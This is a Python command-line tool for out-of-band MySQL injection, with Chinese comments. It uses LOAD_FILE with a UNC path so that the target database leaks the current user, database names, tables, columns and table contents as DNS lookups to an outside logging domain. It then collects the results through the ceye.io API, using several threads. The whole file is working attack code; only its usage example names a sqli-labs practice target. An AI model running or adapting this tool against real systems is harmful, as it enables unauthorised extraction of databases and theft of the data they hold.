#!/usr/bin/env python
# -*- coding: utf-8 -*-

from config import *
from checkSql import check

import requests
import json
import optparse
import sys
import time
from termcolor import *
import random
from string import *
import binascii

import gevent
from gevent import monkey; monkey.patch_all()

from queue import *

#定义了一个DnsSql类
class DnsSql(object):
	def __init__(self, options):
		self.APItoken = APItoken #token令牌
		self.DNSurl = DNSurl   # dnsurl给定的域名
		self.options = options  #命令参数
		self.injUrl = options.url  #攻击网址
		self.check = options.check   #任务名?
		self.taskname = options.taskname   #任务名
		self.thread_count = int(options.thread_count)   #线程数

		self.column = options.column
		self.columns = options.columns #列名

		self.table = options.table
		self.tables = options.tables   #表名

		self.db = options.db
		self.dbs = options.dbs   #库名

		self.dump = options.dump  #数据

		self.dbUser = "select hex(user())"   #得到user sql语句
		self.dbDb = "select hex(database())"  #得到当前库名 sql语句
		self.dbPayload = "select hex(schema_name) from information_schema.schemata" #得到所有库名的 sql语句

		#得到数据的payload
		if self.db:
			self.dbP = '0x'+str(bytes(self.db,'UTF-8').hex())  #进行十六进制编码
			self.tablePayload = "select hex(table_name) from information_schema.tables where table_schema={db}".format(db=self.dbP)
		
		if self.table:
			self.tableP = '0x'+str(bytes(self.table,'UTF-8').hex())
			self.columnPayload = "select hex(column_name)from information_schema.columns where table_name={table} and table_schema={db}".format(table=self.tableP,db=self.dbP)
		
		if self.column:
			self.dataPayload = "select hex(concat_ws(0x3a,{column})) from {db}.{table}".format(db=self.db,table=self.table,column=self.column)
			self.dataPayloadCount = "select concat_ws(0x3a,count(*)) from {db}.{table}".format(db=self.db,table=self.table)
		# self.work = work

	#得到user与db
	def getInf(self):
		print ('[!]Testing Target and Try to get current information!\n')
		# taskname = 'infuser{}'.format(self.taskname)
		#随机产生6个字母
		taskname = ''.join([random.choice(ascii_letters) for j in range(6)])
		origin = 'inf'
		result = []
		userPayload = self.payloadBuilt(taskname, self.dbUser)
		# print (userPayload)
		if self.runPayload(userPayload) == 'True':
			user = self.getDnsData(taskname)
			print ('[*]Current user:\t{}'.format(colored(binascii.a2b_hex(user),'blue')))
			user = self.decode(user)
			print ('[*]Current user:\t{}'.format(colored(user,'red')))
			result.append(user)

		# taskname = 'infdb{}'.format(self.taskname)
		taskname = ''.join([random.choice(ascii_letters) for j in range(6)])
		dbPayload = self.payloadBuilt(taskname, self.dbDb)
		if self.runPayload(dbPayload) == 'True':
			db = self.getDnsData(taskname)
			print ('[*]Current user:\t{}'.format(colored(binascii.a2b_hex(db),'blue')))
			db = self.decode(db)
			print ('[*]Current data:\t{}'.format(colored(db,'red')))
			result.append(db)

		return result



	def getData(self):
		# taskname = 'datalen{}{}{}{}'.format(self.column,self.table,self.db,self.taskname)

		if self.dump:
			try:
				print ('[*]Database:{} Table:{} Column:{}'.format(colored(self.db,'red'),colored(self.table,'red'),colored(self.column,'red')))
				taskname = ''.join([random.choice(ascii_letters) for j in range(6)])
				origin = 'data'
				length = int(self.getLength(self.dataPayloadCount, origin))
				self.threadRun(length, origin)
			except Exception as e:
				print(e)
				return e

		elif self.columns:
			try:
				print ('[*]Database:{} Table:{} '.format(colored(self.db,'red'),colored(self.table,'red')))
				taskname = ''.join([random.choice(ascii_letters) for j in range(6)])
				origin = 'column'
				length = int(self.getLength(self.columnPayload, origin))
				self.threadRun(length, origin)
			except Exception as e:
				print(e)
				return e

		elif self.tables:
			try:
				print ('[*]Database:{}'.format(colored(self.db,'red')))
				taskname = ''.join([random.choice(ascii_letters) for j in range(6)])
				origin = 'table'
				length = int(self.getLength(self.tablePayload, origin))
				self.threadRun(length, origin)
			except Exception as e:
				print(e)
				return e

		elif self.dbs:
			try:
				print ('[*]Fecting Database.')
				taskname = ''.join([random.choice(ascii_letters) for j in range(6)])
				origin = 'db'
				length = int(self.getLength(self.dbPayload, origin))
				self.threadRun(length, origin)
			except Exception as e:
				print(e)
				return e

		elif self.check:
			check(self.injUrl)

		else:
			self.getInf()
			sys.exit(0)



	def threadRun(self, length, model):
		print ('[*]Get data count: {}'.format(colored(length,'red')))
		queue = Queue()
		for i in range(length):
			queue.put(i)

		gevent_pool = []

		for i in range(self.thread_count):
			gevent_pool.append(gevent.spawn(self.dumps, queue, model))
		gevent.joinall(gevent_pool)


	def dumps(self, queue, model):
		while not queue.empty():
			if model == 'db':
				payload = self.dbPayload
			if model == 'table':
				payload = self.tablePayload
			if model == 'column':
				payload = self.columnPayload
			if model =='data':
				payload = self.dataPayload

			count = queue.get_nowait()
			taskname = ''.join([random.choice(ascii_letters) for j in range(6)])

			dumpPayload = self.payloadBuilt(taskname, payload + ' limit {},1'.format(count))
			
			# 获取数据的payload
			# print dumpPayload

			if self.runPayload(dumpPayload) == 'True':
				result = self.getDnsData(taskname)
				print ('[*]Data {}:\t{}'.format(int(count)+1,colored(binascii.a2b_hex(result),'blue')))
				result = self.decode(result)
				print ('[*]Data {}:\t{}'.format(int(count)+1,colored(result,'red')))

	def getLength(self, payload, origin):

		# print origin

		if origin == 'db':
			payload = payload.replace('schema_name', 'count(*)')

		if origin == 'table':
			payload = payload.replace('table_name', 'count(*)')

		if origin == 'column':
			payload = payload.replace('column_name', 'count(*)')

		if origin == 'data':
			payload = payload

		taskname = ''.join([random.choice(ascii_letters) for j in range(6)])
		lenPayload = self.payloadBuilt(taskname, payload)
		
		# 获取数据数量的payload
		# print lenPayload

		if self.runPayload(lenPayload) == 'True':
			if origin == 'data':
				length = self.getDnsData(taskname)
			else:
				length = self.decode(self.getDnsData(taskname))
			return length


	def runPayload(self, payload):
		try:
			r = requests.get(url=payload, headers=headers, timeout=timeout)
			return 'True'
		except Exception as e:
			print(e)
			return e


	def decode(self, code):
		data = code

		try:
			return data.decode('hex')
		except:
			return int(data,16)


	def getDnsData(self, taskname):
		try:
			APIurl = 'http://api.ceye.io/v1/records?token={token}&type={dns}&filter={filter}'.format(token=self.APItoken, dns='dns', filter=taskname)

			r = requests.get(APIurl)

			data = json.loads(r.text)
			
			# print data

			result = data['data'][0]['name'].split('.'+taskname)[0]
			return result
		except Exception as e:
			print(e)
			return e

	def payloadBuilt(self, taskname, payload):
		reqUrl = '.{}.mysqlinj.{}'.format(taskname,self.DNSurl)
		payloadUrl = r'''SELECT LOAD_FILE(CONCAT('\\\\',({payload}),'{reqUrl}\\abc'))'''.format(payload=payload, reqUrl=reqUrl)
		url = self.injUrl.format(payloadUrl)
		return url

def run(options):
	sql = DnsSql(options)
	sql.getData()


if __name__ == '__main__':
	start_time = time.strftime("%Y-%m-%d %H:%M:%S")
	banner()

	print ('[-]{}\n'.format(start_time))
	parser = optparse.OptionParser("usage: %prog [options] -u http://10.1.1.9/sqli-labs/Less-9/?id=1' and ({})--+", version="%prog 1.1")

	parser.add_option("-u","--url", dest='url', default='',  help="target include injection")

	parser.add_option("-c","--check", dest='check', default='', action='store_true', help="task name")

	parser.add_option("-n","--name", dest='taskname', default='dnsloginj',  help="task name")
	parser.add_option("-t","--thread", dest='thread_count', default='5',  help="thread_count")
	parser.add_option("-i","--inf", dest='inf', default='',  help="Testing target and Try to get information")
	parser.add_option("--dbs", dest='dbs', default='',  action='store_true', help="get database")
	parser.add_option("-D", dest='db', default='',  help="database name")

	parser.add_option("--tables", dest='tables', default='', action='store_true', help="get table")
	parser.add_option("-T", dest='table', default='',  help="table name")

	parser.add_option("--columns", dest='columns', default='', action='store_true', help="get column")
	parser.add_option("-C", dest='column', default='',  help="column name")

	parser.add_option("--dump", dest='dump', default='', action='store_true', help="get data")

	(options, args) = parser.parse_args()

	try:

		if options.url:
			run(options=options)
		else:
			parser.print_help()
			sys.exit(0)

	except KeyboardInterrupt:
		print ("Ctrl C - Stopping Client")
		sys.exit(1)




